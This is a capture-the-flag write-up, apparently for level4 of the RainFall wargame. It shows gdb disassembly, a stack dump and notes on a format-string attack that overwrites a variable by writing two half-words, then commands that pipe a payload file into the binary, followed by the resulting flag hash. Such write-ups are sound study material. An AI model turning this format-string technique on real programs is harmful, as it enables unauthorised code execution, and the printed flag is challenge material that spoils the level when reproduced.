# Disassembly of the vulnerable function :

(gdb) disas n
Dump of assembler code for function n:
	0x08048457 <+0>:	push   %ebp
	0x08048458 <+1>:	mov    %esp,%ebp
	0x0804845a <+3>:	sub    $0x218,%esp
	0x08048460 <+9>:	mov    0x8049804,%eax
	0x08048465 <+14>:	mov    %eax,0x8(%esp)
	0x08048469 <+18>:	movl   $0x200,0x4(%esp)
	0x08048471 <+26>:	lea    -0x208(%ebp),%eax
	0x08048477 <+32>:	mov    %eax,(%esp)
	0x0804847a <+35>:	call   0x8048350 <fgets@plt>
	0x0804847f <+40>:	lea    -0x208(%ebp),%eax
	0x08048485 <+46>:	mov    %eax,(%esp)
	0x08048488 <+49>:	call   0x8048444 <p>
	0x0804848d <+54>:	mov    0x8049810,%eax <== Our target variable
	0x08048492 <+59>:	cmp    $0x1025544,%eax <== expected value
	0x08048497 <+64>:	jne    0x80484a5 <n+78>
	0x08048499 <+66>:	movl   $0x8048590,(%esp)
	0x080484a0 <+73>:	call   0x8048360 <system@plt>
	0x080484a5 <+78>:	leave
	0x080484a6 <+79>:	ret
End of assembler dump.

# Same exploit as level3, except here the value is very large.
# 0x1025544(16) == 16 millions, so instead, let's copy two half-words,
# in order to speed up the process of writing the output of the conversion
# to stdout.
# 0x102 and 0x5544 => 258 + 21828 bytes written, which is much less than previously.
# We'll need to copy the smallest half word first, for obvious reasons.
# Here it is the high order one.
# Relevant stack memory dump, this will be useful to identify which positional
# indexes to use :

(gdb) b *0x08048450
Breakpoint 1 at 0x8048450
(gdb) r
Starting program: /home/user/level4/level4
AAAA

Breakpoint 1, 0x08048450 in p ()
(gdb) x/64wx $esp
0xbffff4c0:	0xbffff4f0	0xb7ff26b0	0xbffff734	0xb7fd0ff4
0xbffff4d0:	0x00000000	0x00000000	0xbffff6f8	0x0804848d
0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
0xbffff4f0:	0x41414141

# The first address will be popped off the stack when entering the stack frame
# of printf, so the starting bytes of the buffer will be at $esp + 12.

# Finally :
#
level4@RainFall:~$ python /tmp/payload.py > /tmp/bad
level4@RainFall:~$ cat /tmp/bad - | ./level4
...
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
